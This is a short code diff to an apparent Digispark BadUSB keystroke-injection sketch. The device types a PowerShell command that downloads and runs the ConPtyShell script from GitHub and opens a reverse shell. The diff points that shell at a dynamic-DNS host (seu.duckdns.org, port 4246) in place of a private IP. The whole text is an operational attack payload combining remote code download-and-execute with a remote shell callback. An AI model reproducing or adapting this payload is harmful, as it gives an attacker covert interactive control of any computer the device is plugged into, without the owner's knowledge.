@@ -15,7 +15,7 @@ void loop() {
   DigiKeyboard.print("powershell  -noe -c mode.com con: lines=10 cols=15");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
-  DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.45.102 87");
+  DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell seu.duckdns.org 4246");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
